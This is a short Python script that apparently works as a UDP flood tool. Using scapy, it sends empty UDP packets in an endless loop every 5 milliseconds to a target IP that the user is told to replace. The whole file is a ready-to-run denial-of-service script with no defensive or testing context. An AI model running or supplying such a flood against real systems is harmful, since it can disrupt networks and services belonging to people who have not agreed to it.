import sys
import time
from scapy.all import Ether, IP, UDP, sendp

TARGET_IP = "192.168.2.20"  # Replace with the target IP address
INTERFACE = "Ethernet"  # Replace with your network interface

def send_packets(target_ip, interface):
    packet = Ether() / IP(dst=target_ip) / UDP()

    while True:
        sendp(packet, iface=interface, loop=1, inter=0.005)

if __name__ == "__main__":
    if sys.version_info[0] < 3:
        print("This script requires Python 3.")
        sys.exit(1)

    send_packets(TARGET_IP, INTERFACE)
